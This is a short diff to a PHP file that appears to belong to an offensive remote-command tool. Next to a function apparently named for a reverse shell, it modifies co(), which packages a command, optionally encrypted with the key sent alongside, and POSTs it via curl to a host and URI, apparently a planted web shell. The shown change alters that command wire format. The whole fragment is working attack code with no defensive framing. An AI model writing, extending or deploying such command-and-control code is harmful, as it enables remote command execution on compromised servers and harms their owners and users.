@@ -175,6 +175,7 @@ function rev($host, $shell, $port, $os)
 function co($command, $host, $uri, bool $encrypt)
 {
     $space_Safe_coms = '';
+    $commander = "";
     if ($encrypt === true && !is_null($command)){
         $plain = $command;
         $our_nonce = random_bytes(SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_NPUBBYTES);
@@ -182,22 +183,22 @@ function co($command, $host, $uri, bool $encrypt)
         $additionalData = random_bytes(SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_ABYTES);
         try{
             $cyphered = sodium_crypto_aead_xchacha20poly1305_ietf_encrypt($plain, $additionalData, $our_nonce, $secure_Key);
-            $space_Safe_coms = base64_encode($our_nonce . $additionalData . $secure_Key . $cyphered);
+            $space_Safe_coms = "t=e&ne=" . base64_encode($our_nonce) . "&ad=" .base64_encode($additionalData) . "&k=" . base64_encode($secure_Key) . "&c=" .base64_encode($cyphered);
         }catch (SodiumException $exception){
             echo $exception->getMessage();
             echo $exception->getTraceAsString();
             echo $exception->getLine();
         }
     }else{
-        $space_Safe_coms = base64_encode($command);
+        $space_Safe_coms = "t=u&cr=" . base64_encode($command) . "";
     }
     if (!empty($host) && !empty($command) && !empty($uri)) {
         curl_setopt(CHH, CURLOPT_URL,                       "$host/$uri");
-        curl_setopt(CHH, CURLOPT_TIMEOUT,                              15);
-        curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT,                       15);
+        curl_setopt(CHH, CURLOPT_TIMEOUT,                             15);
+        curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT,                      15);
         curl_setopt(CHH, CURLOPT_RETURNTRANSFER,                    true);
         curl_setopt(CHH, CURLOPT_POST,                              true);
-        curl_setopt(CHH, CURLOPT_POSTFIELDS,        "commander=$space_Safe_coms");
+        curl_setopt(CHH, CURLOPT_POSTFIELDS,                  $space_Safe_coms);
         $syst = curl_exec(CHH);
         if (!curl_errno(CHH)){
             switch ($http_code = curl_getinfo(CHH, CURLINFO_HTTP_CODE)) {
